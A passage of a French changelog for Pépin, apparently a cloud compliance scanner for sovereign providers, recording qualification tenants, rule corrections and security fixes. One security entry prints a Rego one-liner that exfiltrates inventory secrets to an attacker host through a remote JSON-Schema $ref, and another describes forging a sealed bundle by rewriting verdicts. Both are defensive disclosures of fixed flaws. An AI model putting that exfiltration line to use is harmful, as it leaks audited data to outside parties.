> [🇬🇧 English](CHANGELOG.md) · 🇫🇷 Français

# Journal des changements

Les changements notables, au format [Keep a Changelog](https://keepachangelog.com/fr/1.1.0/),
versionnés selon [Semantic Versioning](https://semver.org/).

Ce fichier est lu par le workflow de release : la section correspondant à un
tag devient le corps de sa GitHub Release. Une entrée absente d'ici est une
entrée qu'aucun lecteur téléchargeant un binaire ne verra jamais.

Deux sortes de changements méritent leur ligne quelle que soit leur taille,
parce que c'est sur elles qu'une chaîne de conformité bâtie sur Pépin est
jugée : **une surface qu'un pipeline consommateur parse** (la forme de
l'assessment, des findings, du bundle ou de l'OSCAL, un code de sortie, un
verbe ou un flag de la CLI), et **un verdict qui peut changer sur un tenant
inchangé** (une règle durcie ou assouplie, un contrôle activé ou retiré, un
mapping normatif retrié). La première casse leur parsing ; le second oblige
leur utilisateur à expliquer à un auditeur un changement qu'il n'a pas fait,
et c'est ici que cette explication commence. Un refactor qui ne change ni
l'une ni l'autre appartient au `git log`.

## [Non publié]

### Ajouté

- **Tenants de qualification Outscale et Exoscale** (issue #198). Outscale : 79 ressources
  Terraform, plus 6 buckets OOS et une politique EIM inline créés par le crochet `extra`
  du tenant, appliqués et détruits sur un compte réel — la machine à deux cartes, la clé
  root, la famille `iam_policy_*`, les snapshots, une OMI publique, des load balancers ;
  le runner applique désormais `pre_destroy_vars` avant de détruire (une VM protégée ne
  se détruit pas, provider #88) et reliste jusqu'à ce que les suppressions soient
  effectives. Exoscale : plan seul, 37 ressources, sans compte — la source Terraform
  est épinglée, la moitié live attend un compte.

- **Tenant de qualification Exoscale, moitié live** (issue #198) : 40 ressources dans
  le plan complet, 39 appliquées (le quota de l'organisation est de quatre instances ;
  l'instance suisse n'est que sur le plan, par `terraform_only_resources`), plus 3
  buckets SOS créés par le crochet `extra` (dont un avec Object Lock, par l'API S3),
  appliqués, scannés en `--live` dans les cinq formats, scellés, détruits et prouvés
  détruits sur deux zones (15 familles d'API + buckets, delta avant/après).
  L'organisation attendue vient de `PEPIN_QUAL_EXO_ORG`, confirmée par
  `GET /api-key/{key}` → `org-id` avant tout apply. Ce que la passe live a trouvé,
  épinglé tel que mesuré et consigné : SOS accepte `PutBucketTagging` et ne persiste
  rien (#208, tout bucket SOS échoue `governance_resource_required_tags`) ;
  `kubernetes_cluster_audit_logging_enabled` passe en live sur un cluster dont l'audit
  est désactivé (#209, faux vert : l'API rend `audit: {}` et `audit_enabled` est dérivé
  de `audit.endpoint`) ; `region` n'est projetée sur aucune ressource live (#210,
  `governance_resource_region_in_eu` not-evaluated) ; les labels des instances ne sont
  pas collectés en live (#211, une instance sans étiquette passe) ; une instance privée
  n'a pas de groupe de sécurité par construction (#212, `compute_instance_has_security_group`
  parle avec une remédiation inexécutable) ; chaque cluster SKS crée un rôle IAM
  `sks-ccm-*` qui échoue deux contrôles `iam_role_*` (#213). Les deux changements de
  règle de #206 sont épinglés : `…_all_ports` est `not-applicable` chez Exoscale,
  `network_securitygroup_unrestricted_egress` échoue sur `tcp 1-65535`.

- **Un tenant de qualification, appliqué et détruit sur un compte réel** (issue #178,
  étape 3). `PEPIN_GATE_LIVE=1 mise run qualify` applique la stack Terraform committée
  sous `references/qualification/scaleway/` — 40 ressources dans le plan, dont 29
  appliquées : les cinq types qu'un scan live collecte ; bases managées, réseaux
  privés et politiques IAM n'existent que sur le plan, parce qu'aucun scan live ne
  les verrait —, une faute par ressource, un contre-exemple par contrôle, la scanne en `--live` dans tous les formats,
  scelle et vérifie le bundle, scanne le même plan en `--terraform`, la détruit,
  prouve la destruction (listing par famille sur le tag du tenant, plus un delta
  avant/après du compte), et compare les deux assessments à l'`expected.yaml`
  committé (contrôle × source × sujet → statut). Le runner refuse de démarrer sur un
  autre compte que celui qui y est épinglé, et casse une de ses propres attentes à la
  fin de chaque run pour prouver qu'il sait dire NO-GO. Un geste de mainteneur, avec
  les seuls identifiants natifs, jamais de CI.

### Sécurité

- **`verify` n'accepte plus un bundle qui se contredit.** Réécrire quatre résultats
  `fail` en `pass` puis recalculer l'empreinte du fichier touché produisait un bundle
  déclaré « cohérent en interne », code 0 — alors que son propre `manifest.json`
  annonçait encore `"fail": 4`. Le bundle portait déjà l'information qui le
  contredisait, et rien ne comparait les deux. Trois recoupements le font désormais,
  aucun n'exigeant de clé : le résumé du manifeste est confronté aux statuts réellement
  présents dans `assessment.json`, la **taille** déclarée de chaque artefact est
  vérifiée à côté de son empreinte, et `checksums.txt` est lu **strictement** — une
  ligne illisible ou dupliquée est un refus, là où un octet ajouté passait inaperçu.
- **`verify --require-signature`** échoue si aucune signature n'a été vérifiée. Un
  appelant qui script `verify` recevait 0 pour un bundle que l'outil qualifie lui-même
  de non opposable : l'avertissement était sur stdout, le code disait « réussi », et
  l'automatisation lit le code. Opt-in, donc aucune chaîne existante ne change. Surface
  CLI v5 → v6.

  Ce que cela ne fait **pas**, et la limite mérite d'être dite : fermer la chaîne
  d'empreintes. Rien dans un bundle ne peut ancrer `checksums.txt`, puisque qui réécrit
  un fichier réécrit aussi l'ancre. Seule la signature détachée cosign le peut. Ces
  recoupements attrapent la corruption et la contradiction interne, pas un
  falsificateur déterminé.

### Sécurité

- **Une politique tierce pouvait exfiltrer l'inventaire audité, en silence.** Les règles
  chargées à chaud via `--policy-dir` sont du code tiers, exécuté sur tout ce que le
  scan a collecté. Le moteur avait retiré `http.send`, `net.lookup_ip_addr` et
  `opa.runtime` et annonçait le réseau hors de portée ; c'était faux. OPA résout le
  `$ref` distant d'un JSON-Schema par HTTP **au moment de l'évaluation**, sur un chemin
  qu'aucun builtin ne garde, et une ligne suffisait :
  `json.match_schema(input, {"$ref": sprintf("%s/leak/%s", [attaquant, input.secret])})`.
  Mesuré contre le scankit v0.2.2 épinglé, avec un serveur témoin : la requête partait,
  et `Evaluate` ne rendait **aucune erreur** — le silence était la partie qui comptait.
  scankit est désormais épinglé en v0.3.1, dont le jeu de capacités porte
  `AllowNet: []string{}` (vide et non nul refuse tout hôte), et
  `TestNoThirdPartyPolicyCanReachTheNetwork` tend un témoin contre lui pour qu'une
  régression d'épinglage ne rouvre pas la brèche en silence.

### Corrigé

- **Un contrôle émettait six écarts justes chez un fournisseur pour lequel le
  référentiel ne le déclarait pas.** `objectstorage_bucket_default_encryption` se
  déclenche chez Scaleway — le collecteur S3 commun pose `default_encryption_enabled`
  sur chaque bucket, et le SSE y est opt-in par bucket, donc un bucket sans
  configuration écrit ses objets en clair. Les verdicts étaient justes ; c'est la
  déclaration qui était fausse, et la matrice affichait ✗ pour un fournisseur que
  l'outil mesurait réellement. Déclaré désormais, l'attribut consigné au contrat du
  fournisseur avec sa source.
- **Deux contrôles déclarés ✅ chez Exoscale ne pouvaient jamais se déclencher, et les
  deux cas ne méritaient pas la même réponse.** Tous deux exigeaient `protocol == "all"`,
  qu'une règle de security group Exoscale ne sait pas exprimer (le schéma du provider et
  l'API v2 n'acceptent que ah, esp, gre, icmp, icmpv6, ipip, tcp, udp). `…_to_all_ports`
  y est désormais **non applicable**, avec la justification sourcée : le mécanisme
  any/any n'existe pas, et les contrôles de familles de ports couvrent le cas réel. Mais
  `unrestricted_egress` a été **élargi** au lieu d'être écarté — une sortie ouverte
  EXISTE chez Exoscale, elle s'écrit `tcp 1-65535 → 0.0.0.0/0`, et la déclarer non
  mesurable aurait caché un fait de posture réel. La borne est stricte : une sortie
  limitée à quelques ports est un filtrage, et crier dessus est le faux positif qui fait
  désactiver un outil.
- **Une règle de security group sans description obtenait `pass` — du contrôle qui
  existe pour attraper exactement ça.** La règle se gardait par
  `"description" in object.keys(...)`, censé répondre « ce fournisseur expose-t-il le
  champ », mais posé **par ressource**. Sur un plan Terraform, un exploitant qui n'écrit
  aucune description ne produit tout simplement pas le champ : la règle se taisait — et
  le silence devenait un `pass`, le verrou de capacité voyant `description` collectée
  sur le type (une autre règle la portait) et laissant l'assessment conclure faute de
  finding. Un `pass` que rien n'établissait, sur l'écart même que le contrôle vise. La
  question se pose désormais à l'échelle de l'**inventaire** : si une règle porte la
  clé, le fournisseur expose le champ, et une règle qui n'en a pas n'est pas
  documentée. Aucune règle ne lit la provenance — l'ADR-0017 l'interdit — et le
  contre-exemple que la garde d'origine protégeait tient toujours : un fournisseur qui
  n'expose ce champ nulle part ne déclenche rien.
- **Un sujet fautif par plusieurs voies ne se lit plus comme plusieurs écarts.** Trois
  blocs `deny` d'`objectstorage_bucket_public_access` — ACL prédéfinie, grant, politique
  de bucket — concluent sur le même bucket, et chaque cause est réelle. Mais un bucket
  public est UN problème, et l'imprimer trois fois faisait paraître le rapport plus gros
  que ce qu'il mesure. Pire, cela occupait les trois places du panneau « action
  immédiate », qui annonce les trois écarts les **plus graves** et en livrait trois fois
  le même. Corrigé en amont dans scankit 0.3.5 : une ligne par sujet avec ses causes en
  dessous, et le panneau déduplique par (code, sujet) avant de classer. L'agrégation ne
  porte que sur l'**affichage** — le décompte du bloc, les formats analysables et le
  tableau de sévérité continuent de porter chaque cause séparément.
- **Un document qui n'a pas la forme d'un inventaire est refusé au lieu d'être scanné
  comme un inventaire vide.** Une sortie `terraform show -json` passée sans
  `--terraform`, ou un objet vide, étaient acceptés et évalués comme un inventaire
  vide : code 3, « rien de mesuré ». Honnête sur ce qui a été mesuré, faux sur la
  cause — l'appelant n'a pas un périmètre vide, il a donné le mauvais fichier, ce qui
  est le code 2. Un plan est nommé comme tel (« ce fichier est un plan Terraform : le
  scanner avec `--terraform` »), et l'échange inverse était déjà refusé : les deux sens
  marchent désormais du même pas. Les tests du dépôt s'appuyaient sur le défaut : deux
  d'entre eux passaient un plan en position d'inventaire.
- **La matrice de couverture mesure ce qu'un plan porte au lieu de déclarer ce que le
  mapping nomme.** `compute_instance_public_ip_with_open_securitygroup` affichait ✅ pour
  outscale/terraform alors que `public_ip` est calculé — Terraform ne le connaît
  qu'après `apply`, donc aucun plan réel ne le porte — et les scénarios de véracité
  confirmaient la cellule sur un plan écrit à la main où l'attribut est un littéral. La
  couverture est désormais corrigée par ce que les plans des tenants de référence,
  générés depuis du HCL tiers, produisent réellement. Trois cellules passent de ✅ à ◐,
  et le motif distingue « le mapping ne le nomme pas » (qui se corrige dans la spec) de
  « le mapping le nomme mais aucun plan ne le porte » (qui ne s'y corrige pas du tout).
  Six obligations qui ne pouvaient jamais être tenues quittent le registre de véracité
  avec elles.
- **Le rapport terminal imprimait le titre et la remédiation d'un contrôle au-dessus
  des findings d'un AUTRE.** Un bloc imprime un code, un titre et une remédiation puis
  liste des findings dessous : il affirme donc ces trois choses de chacun d'eux — or le
  regroupement se faisait sur le seul code SCSL, et une exigence couvre souvent
  plusieurs contrôles. Le titre et la remédiation étaient alors ceux du premier finding.
  Mesuré sur un tenant réel, la ligne sur laquelle un lecteur agit lui disait de
  révoquer une clé root pour corriger une autorisation `Resource="*"`. Corrigé en amont
  dans scankit 0.3.4 : la clé de regroupement est désormais exactement ce que le bloc
  affirme, donc `CLD-IAM-1` rend un bloc par contrôle et le tableau des contrôles cesse
  d'additionner sévérité et décomptes sur une ligne qui recouvrait deux contrôles. Un
  contrôle unique sous un code rend à l'identique.
- **Une VM publique par sa carte secondaire, SSH ouvert sur cette carte, ne produisait
  aucun finding.** Le collecteur projetait l'union des IP publiques des cartes, donc la
  machine comptait pour publique — mais il la confrontait à `Vm.SecurityGroups`, que
  l'OAPI documente comme les groupes de la carte **primaire**. Mesuré sur un tenant
  réel : SSH répondait sur l'adresse publique et le rapport ne disait rien. L'exposition
  est une propriété de la **carte** : une ressource `network_interface` est désormais
  collectée par NIC (`nic_id`, `vm_id`, `public_ip`, `security_group_ids`) et la règle
  apparie une adresse avec les groupes **de la même carte**. L'aplatissement est fautif
  dans les deux sens, et c'est pourquoi le correctif n'est pas une union plus large :
  une carte publique au groupe fermé plus une carte privée au groupe ouvert se liraient,
  une fois réunies, comme « publique et ouverte » — un écart que la machine ne porte
  pas. Là où les cartes ne sont pas collectées (un plan Terraform), la machine reste
  jugée sur ses propres attributs : un repli muet aurait fait DISPARAÎTRE des écarts.
- **SecNumCloud était déclaré par fournisseur, alors qu'une qualification couvre un
  périmètre de régions.** Celle d'Outscale couvre `cloudgouv-eu-west-1` et elle seule ;
  un tenant en `eu-west-2` lisait « SecNumCloud qualifié » dans un `pass` de
  souveraineté, ce qui est la première affirmation qu'un auditeur conteste. Le
  descripteur déclare désormais le périmètre (`secnumcloud_regions`, sourcé), et
  l'attribut `secnumcloud` est rendu **pour la région réellement scannée** : `qualifie`
  dans le périmètre, `hors_perimetre` en dehors, `perimetre_inconnu` quand le scan n'a
  pas de région — un scan qui ne sait pas où il porte ne tranche pas. La qualification ne
  vaut donc plus immunité extraterritoriale hors de son périmètre, et la page du
  fournisseur ne peut plus imprimer le statut sans lui. Aucun écart nouveau n'est émis,
  aucun code de sortie ne bouge.
- **La page d'installation épinglait `v0.1.0`, la version dont ce dépôt écrit lui-même
  qu'elle refuse toute installation.** `examples/github-actions/pepin.yml` le dit en
  toutes lettres : en v0.1.0 et v0.1.1, l'installeur de l'action appelait
  `gh attestation verify` sans jeton, ce qui refusait *toute* installation. La page
  d'installation est la première qu'on recopie. Chaque épinglage nomme désormais la
  dernière release, une phrase dit que l'appelant ne passe aucun jeton depuis v0.2.0, et
  une garde exige que les versions épinglées soient celle que le CHANGELOG déclare —
  lue dans le dépôt plutôt que dans les tags git, pour qu'un `clone` de CI sans tags ne
  puisse pas la faire dériver.
- **Quatre messages de la CLI désignaient la mauvaise chose.** `--policy-dir
  /inexistant` et `provider validate <fichier>` rapportaient tous deux `.` — la racine
  de la vue de système de fichiers qu'ils venaient de construire — au lieu de l'argument
  reçu ; un fichier passé là où un dossier est attendu est maintenant refusé comme tel.
  `--kubeconfig` sans `--live` proposait deux sources qui ne sont pas celle que
  l'appelant venait de nommer ; l'erreur et l'aide du drapeau disent désormais qu'il
  exige `--live`.
- **Une `--region` inconnue est signalée avant que la collecte n'échoue.** `--region
  eu-nowhere-9` coûtait une minute de résolutions DNS en échec et dix-sept unités
  « service indisponible » à lire avant d'en deviner la cause. C'est un
  **avertissement**, pas un refus : la liste des régions appartient au fournisseur, et
  une région ajoutée demain doit rester scannable le jour même — ce qui la sépare d'un
  `--gate` inconnu, dont le vocabulaire est celui de Pépin. Le catalogue vit auprès du
  descripteur du fournisseur, et une garde exige qu'il coïncide avec celui que les
  règles de souveraineté portent déjà.
- **`control explain` accepte le code que le rapport imprime.** La colonne « Code » du
  rapport terminal et chaque en-tête de bloc portent l'exigence SCSL (`CLD-STO-1`), et
  `--format json` la porte dans `code` ; la commande n'acceptait que l'identifiant de
  check, que le rapport n'imprime jamais. Un lecteur qui venait de lire un verdict
  devait deviner. Les deux formes fonctionnent désormais, sans distinction de casse, et
  une exigence couvrant plusieurs contrôles les nomme tous plutôt que d'en choisir un en
  silence.
- **Une clé d'accès dont l'expiration est dépassée ne compte plus comme conforme.** La
  règle ne refusait qu'une date ABSENTE, si bien qu'une clé encore `ACTIVE` deux ans
  après son échéance passait — mesuré sur un tenant réel. Les deux lectures de cet état
  sont mauvaises, et c'est pourquoi le `pass` était faux : soit le fournisseur honore
  encore la clé et l'expiration ne protège rien, soit il ne l'honore plus et une clé
  morte reste déclarée active. Le scan n'a pas à trancher laquelle pour savoir que
  « conforme » est faux. L'instant de référence est celui de l'ÉVALUATION, pas
  l'horloge : le rejeu d'un bundle scellé rend donc le même verdict.
- **Un scan qui n'a rien mesuré ne se rend plus comme conforme.** Une coche verte,
  « Aucun écart sur le périmètre audité » et quatre compteurs à zéro s'imprimaient
  immédiatement au-dessus d'un verdict `INDÉTERMINÉ`. Trois signaux littéralement vrais
  et collectivement trompeurs : « aucun écart trouvé » et « rien n'a été regardé » se
  rendaient à l'identique. Le code de sortie était déjà 3, donc l'automatisation se
  comportait correctement — le mode d'échec était la personne qui survole un terminal,
  ou la capture collée dans un ticket. Le marqueur est désormais neutre, la ligne nomme
  la cause, et les compteurs sont tus. Un scan réellement conforme garde les trois, et
  le test le vérifie aussi : rendre les deux cas identiques n'aurait fait que déplacer
  la confusion.
- **Un groupe de sécurité ouvert à tout Internet par des plages `/2` ne produisait
  aucun finding.** `is_public_cidr` ne jugeait publique qu'une plage de préfixe ≤ 1, si
  bien que les quatre plages `0.0.0.0/2`, `64.0.0.0/2`, `128.0.0.0/2`, `192.0.0.0/2` —
  qui couvrent ensemble tout l'IPv4 — passaient inaperçues, pendant que `0.0.0.0/1` du
  même groupe était attrapé. Mesuré sur un tenant Outscale réel : RDP ouvert à tout
  Internet, et le rapport muet. Un `/3`, ou une liste de `/8`, passaient de même. Une
  source est désormais non restreinte quand elle est **large** (préfixe ≤ 8) **et non
  privée** — la seconde condition est ce qui garde `10.0.0.0/8` sur le port 22
  silencieux, et le réseau d'un partenaire comme `203.0.113.0/24` n'est délibérément pas
  signalé : « ouvert à Internet » et « ouvert à quelqu'un d'autre » sont deux
  affirmations différentes.

  L'union est fermée elle aussi : `net.cidr_merge` fusionne les plages d'une règle avant
  de les juger, si bien que 512 `/9` couvrant l'espace deviennent `0.0.0.0/0` et sont
  signalées — mesuré. Les entrées brutes restent éprouvées à côté, parce qu'un littéral
  sans masque (`0.0.0.0`, `*`) n'est pas un CIDR valide et que la fusion le perdrait ; et
  seules les entrées valides sont fusionnées, parce que `net.cidr_merge` devient indéfini
  sur une entrée malformée, ce qui rendrait la règle muette sur une donnée de tiers.

  La fusion ne rapproche que le CONTIGU, si bien qu'un damier lui échappait : 256 `/9`
  une sur deux — la moitié d'Internet — donnaient 256 blocs inchangés et restaient
  muettes. Les adresses publiques qu'une liste de sources ouvre sont désormais
  **comptées**, exactement : les blocs fusionnés sont disjoints, et deux CIDR sont soit
  disjoints soit emboîtés, donc la taille publique d'un bloc est la sienne moins celle
  des espaces à usage spécial qu'il contient. Un seul finding par ressource nomme
  l'union — `0.0.0.0/0`, ou `256 CIDR → 1848508416 IPv4` — au lieu d'un par plage.
- **La description racine nomme les fournisseurs qui existent.** La première phrase
  qu'un nouvel utilisateur lit annonçait OVH — une entrée de feuille de route, pas un
  fournisseur — et omettait Kubernetes, qui en est un. La liste est désormais dérivée du
  registre : une liste recopiée se périme au premier fournisseur ajouté ou retiré, et
  personne ne relit une phrase d'accueil.
- **`pepin scsl --index` ne pointe plus par défaut vers la disposition locale d'un
  mainteneur.** Le défaut était un chemin relatif remontant hors du répertoire courant
  vers un dépôt dont le lecteur n'a jamais entendu parler. L'erreur était juste et ne
  disait rien : impossible de savoir si `framework-scsl` était à installer, un
  sous-module oublié, ou un projet interne. `--index` est désormais requis, et le
  message dit ce qu'est le fichier, que la commande est un outil de **maintenance** dont
  un scan n'a pas besoin, et donne un exemple.
- **Une valeur inconnue de `--format` est refusée au lieu de retomber sur la table.**
  Le scan tournait et imprimait le rapport table, avec le code de sortie d'un scan
  réussi. Le cas dangereux n'est pas l'humain qui tape `xml` à un prompt et le
  remarque : c'est l'étape de pipeline écrite `--format oscal` éditée en
  `--format oscal2`, qui publie un tableau colorié là où toute la chaîne en aval croit
  recevoir de l'OSCAL. Un format inconnu appartient à la famille de l'export illisible
  et du fournisseur inconnu — une erreur d'invocation, code **2**, pas un résultat de
  scan.
- **Le mode français ne laisse plus l'ossature du rapport en anglais.** Titres de
  section, en-têtes de table et ligne « aucun écart » sortaient en anglais au milieu
  d'un rapport français — `Total deviations: 1` au-dessus d'un finding français, se
  refermant sur un verdict français. Les chaînes du framework aussi : gabarit d'usage,
  `help for <cmd>`, erreurs de nombre d'arguments, drapeau inconnu. Un rapport à moitié
  traduit se lit comme un travail inachevé plutôt que comme un choix, et le lecteur
  visé — un auditeur francophone d'un cloud souverain — est précisément celui qui le
  remarque.

  Une chaîne reste en anglais : le `unknown command … Did you mean this?` de cobra,
  construit au fond de `Command.Find` sans point d'accroche. La traduire exigerait de
  reconnaître son texte anglais, donc de faire dépendre le comportement de la
  formulation d'une dépendance. `TestTheUntranslatedCobraResidueIsKnown` tient ce
  résidu inventorié et échoue dans les deux sens : il ne peut ni grandir, ni être
  oublié une fois corrigé en amont.
- **Une sous-commande inconnue ne rend plus 0, et n'exécute plus autre chose.**
  `pepin provider inexistant` lançait silencieusement `provider list` ; `pepin control
  list` — la supposition naturelle, symétrique de `provider list` — rendait un écran
  d'aide et réussissait. Une étape de pipeline écrite `pepin control list --json >
  controls.json` écrivait donc l'aide dans le fichier et passait au vert. Chaque
  commande valide désormais ses arguments et rend **2** sur un argument qu'elle ne
  comprend pas. Une garde parcourt l'ARBRE des commandes plutôt qu'une liste écrite à
  la main, et elle a trouvé un cinquième cas que le rapport n'avait pas : `provider
  list` ignorait tout argument.
- **Un inventaire dont l'origine contredit le jeu de règles demandé est désormais
  refusé.** Scanner un inventaire Scaleway avec les règles Exoscale était accepté sans
  un mot et produisait six verdicts `pass`. Ces `pass` n'étaient pas faux par accident :
  ils étaient **vides de sens**, les formes de ressources se recouvrant juste assez pour
  que des règles s'évaluent et concluent. Le mode d'échec était silencieux et réaliste —
  une faute de frappe dans un pipeline, un job copié-collé — et le rapport avait l'air
  parfaitement normal, avec un code de sortie non nul qui suggérait même que le scan
  avait travaillé. La déclaration est lue à la racine de l'export et sur ses ressources,
  et une discordance sort en **2**, le code déjà employé pour un export illisible. Un
  inventaire qui ne déclare rien n'est pas refusé : une origine absente ne s'invente pas.
- **`evidence.proves` ne voyage plus en `["","",""]` sur chaque résultat.** `omitempty`
  sur un tableau de taille fixe est sans effet, si bien qu'un lecteur ne pouvait pas
  distinguer « aucune preuve enregistrée » de « trois preuves enregistrées, toutes
  vides » — y compris dans un bundle scellé archivé pour plus tard. Corrigé en amont
  dans scankit v0.3.1, et gardé ici, là où les dossiers sont publiés.

### Ajouté

- **Le corpus de fuzzing survit à une campagne.** Les entrées intéressantes
  s'accumulaient dans `GOCACHE`, qui disparaît avec la machine — et un runner de CI
  démarre toujours à froid. Mesuré ici : 125 entrées intéressantes en vingt-cinq
  secondes contre deux graines versionnées, si bien que chaque campagne repartait de
  deux et refaisait le chemin que la précédente avait déjà parcouru. C'est du *travail*
  perdu, à chaque exécution. `mise run fuzz-promote` promeut les entrées vers le corpus
  versionné selon trois règles écrites : un échantillon plafonné DÉTERMINISTE (un tirage
  au hasard rendrait le diff illisible et le résultat irreproductible), un plafond qui
  borne le **corpus** et non l'exécution (chaque graine est rejouée par chaque
  `go test`, donc un corpus qui enfle est un coût permanent qui enfle avec lui), et —
  celle qui compte — **chaque candidate est éprouvée contre l'arbre courant avant d'être
  acceptée**. Une graine qui fait tomber sa cible est écartée et nommée : elle entre avec
  la correction qu'elle motive, jamais avant. Le workflow de campagne conserve désormais
  ce qu'il a exploré à chaque exécution, pas seulement à l'échec, et imprime le nombre de
  graines dont il est parti.
- **`iam_accesskey_rotated` : la moitié « rotation » de CLD-IAM-2, que rien ne
  mesurait.** L'exigence demande des clés longue durée « assorties d'une expiration ET
  d'une rotation ». L'expiration se lit sur un champ ; la rotation ne se lit nulle part —
  elle se déduit de l'âge de la clé, parce qu'une clé jamais remplacée est une clé jamais
  tournée. Mesuré sur un tenant réel : une clé expirant en 2099 satisfait le contrôle
  d'expiration sans qu'aucune rotation n'ait eu lieu, et un compte avec
  `MaxAccessKeyExpirationSeconds: 0` n'a aucun plafond pour la borner non plus. La
  fenêtre est `controls.iam.key_max_age_days`, 90 jours par défaut ; l'allonger tait des
  écarts, donc le référentiel l'adosse à l'exigence par `au_plus_le_defaut`. Schéma
  d'inventaire v4 → v5 : une `access_key` porte désormais `creation_date` (osc-sdk-go
  v2.24.0 `AccessKey.CreationDate`, vérifié dans le SDK).
- **`scan --gate <all|security|compliance|sovereignty>` : un profil pour la porte de
  CI, qui ne cache rien.** Un premier scan doit provoquer « ah oui, ça c'est
  intéressant », pas « oui, je sais que ma VM de test n'a pas de protection contre la
  suppression ». Le rapport reste COMPLET dans tous les formats — c'est la règle déjà
  appliquée aux dérogations et aux constats d'incertitude : le rapport dit tout, seule
  la porte filtre. Ce qui change est ce qui pèse dans le **code de sortie**, et chaque
  scan imprime ce qui a été mis de côté et pourquoi.
  **Aucun profil ne peut faire passer une chaîne de rouge à vert** : un `1` devient au
  pire un `3` — « n'établit pas la conformité », la lecture honnête d'un scan
  volontairement partiel (ADR-0005, et toujours pas de cinquième code) —, jamais un
  `0`. Le défaut reste `all`, donc rien ne change sans le drapeau. Surface CLI v5 → v6.
  Le drapeau ne s'appelle pas `--profile` : ce nom désigne déjà le profil
  d'identifiants de la collecte live.
- **Un finding déclare désormais sa CONFIANCE, distincte de sa sévérité.** La sévérité
  dit la conséquence si le problème est réel ; la confiance dit à quel point Pépin est
  sûr de l'avoir établi. Un volume sans sauvegarde récente et une VM dont SSH est ouvert
  à Internet étaient tous deux `high` et indiscernables — le premier est `contextual`
  (la règle le documente elle-même : un volume peut être sauvegardé autrement), le
  second `confirmed`. `labels.confidence` vaut `confirmed`, `probable`, `heuristic` ou
  `contextual`, déclarée règle par règle, et une règle sans confiance casse la CI.
- **`labels.category` gagne `sovereignty` et `hygiene`.** La souveraineté est la raison
  d'être de ce produit et était rangée sous `compliance`, où un filtre ne pouvait pas la
  trouver ; l'hygiène documentaire n'est ni une faille ni un manquement normatif, et la
  confondre avec l'un des deux est ce qui rend un premier scan irritant. Sept findings
  passent en `sovereignty`, trois en `hygiene`.
- **Le vocabulaire de confiance de la détection de secrets rejoint le vocabulaire
  commun** : `high`/`medium`/`low` deviennent `confirmed`/`probable`/`heuristic`, sans
  perdre de granularité. Un `secrets.min_confidence` écrit avec les anciens mots reste
  accepté, au même rang, et normalisé dans la configuration résolue — une politique
  committée ne change pas de sens en silence.
- **La carte de qualité publie désormais la précision, dérivée du corpus de
  contre-exemples.** « 42 contrôles » est une phrase que tous les CSPM prononcent.
  Détecter et se TAIRE sont deux mesures différentes, et elles s'impriment maintenant
  côte à côte : 42 contrôles `high`/`critical` actifs, 18 dont un chemin de détection
  est prouvé de bout en bout, 16 dont un contre-exemple légitime l'est, 0 faux positif
  mesuré sur les contre-témoins durcis. Il n'y a délibérément **aucune ligne « faux
  négatifs »** : rien dans le dépôt ne les mesure, et un « 0 » publié voudrait dire
  « nous n'avons pas cherché ». Une garde échoue si ce champ est ajouté, une autre
  refuse tout chiffre de précision supérieur à son dénominateur.
- **Chaque règle `high`/`critical` doit désormais prouver ce sur quoi elle REFUSE de
  se déclencher.** Le contrat de véracité prouvait que Pépin sait produire le verdict
  attendu ; il ne prouvait jamais qu'il le RETIENT sur une configuration voisine et
  légitime. Une règle qui se déclenche sur tout est parfaitement sensible et sans
  précision aucune. Un contre-exemple est un **couple** sur un même chemin contrôle ×
  fournisseur × source : un cas `fail` et un cas `pass` proche. 13 écrits à ce jour,
  chacun éprouvé dans les deux sens ; les 26 manquants sont comptés dans un registre
  exact dans les deux sens, et un contrôle `high`/`critical` ajouté sans son
  contre-exemple casse la CI. `mise run counterexamples-update` le régénère.
- **Les tenants de référence : des configurations tierces, rejouées à chaque build.**
  Une fixture est écrite par l'auteur de la règle : elle prouve que la règle *se
  déclenche*, jamais qu'elle a *raison* sur une configuration que personne n'a conçue
  pour elle. Six stacks réelles, publiées, sous licence MIT ou Apache (deux par
  fournisseur souverain) sont désormais épinglées à un commit sous
  `references/tenants/`, scannées à travers le binaire à chaque build, et comparées aux
  verdicts consignés à côté d'elles. Chaque fournisseur porte un tenant **exposé** et
  son **contre-témoin durci** — le seul endroit où un faux positif se voit. Rien n'est
  provisionné : `terraform plan` ne crée aucune ressource cloud.
  `scripts/reference-tenant.sh --all` re-dérive les six plans depuis leurs amonts **à
  l'octet près**, pour qu'un relecteur puisse vérifier que ce ne sont pas des fichiers
  que Pépin a fini par s'écrire à lui-même. Cf.
  [Les tenants de référence](docs/guides/reference-tenants.fr.md).
- Le plan committé pour un tenant ne porte **que ce que Pépin lit** (`planned_values` et
  les `source` de modules), toute valeur que Terraform lui-même marque `sensitive` étant
  mise à null. `TestNoReferenceTenantPlanCarriesMoreThanPepinReads` refuse le reste :
  `variables`, `provider_config`, `prior_state` et `resource_changes` sont précisément
  là où un plan pris sur un tenant réel porterait ses identifiants.
- **Les scans canari à la qualification de release.** `mise run canary` interroge le
  **vrai** plan de contrôle de chaque fournisseur cloud et consigne ce qu'il a répondu
  dans `references/canary/<fournisseur>.yaml`, committé et daté. Il ne détient **aucun
  identifiant** et n'en a pas besoin : il envoie des valeurs synthétiques que le
  fournisseur refuse, et ce qui se mesure est le refus — un endpoint qui répond 401/403
  existe et se résout, un endpoint déplacé répondrait 404, c'est-à-dire la régression
  qu'un descripteur ne peut pas voir venir. Première mesure, 31 endpoints : tous ont
  répondu, aucun n'a bougé. Il n'établit **pas** qu'un droit *suffisant* rende `200`, et
  ne vaut donc pas validation live d'un contrôle. La complétude est une porte de test
  (`internal/canary`) ; la **fraîcheur** — aucun relevé de plus de 90 jours — est
  vérifiée par le preflight, qui ne détient jamais de secret. Cf.
  [Publier une release](RELEASING.fr.md).

- **Une carte de qualité de détection générée**,
  [docs/detection-quality.fr.md](docs/detection-quality.fr.md). Plutôt que d'annoncer
  « 57 contrôles », elle publie ce qui se vérifie : **63 verdicts prouvés sur 458**,
  **23 chemins entièrement prouvés sur 178**, et la ventilation par verdict — `fail` 10/140,
  `pass` 24/140, `not-evaluated` 18/156, `not-applicable` 11/22. Chaque chiffre est dérivé du
  registre de véracité, des tenants de référence et des relevés de canari ; aucun n'est saisi,
  et `TestTheMapNeverExceedsTheLedger` refuse que la carte et le registre divergent.
  **Validé en live : 0 %** — dérivé, pas écrit : seul un relevé authentifié le ferait monter,
  et un canari ne détient aucun identifiant.
- **`pepin control explain <code> [--provider p]`** : un nouveau verbe CLI (**surface cli v5**).
  Pour un contrôle et un fournisseur, il rend la chaîne qui rend son verdict opposable : les
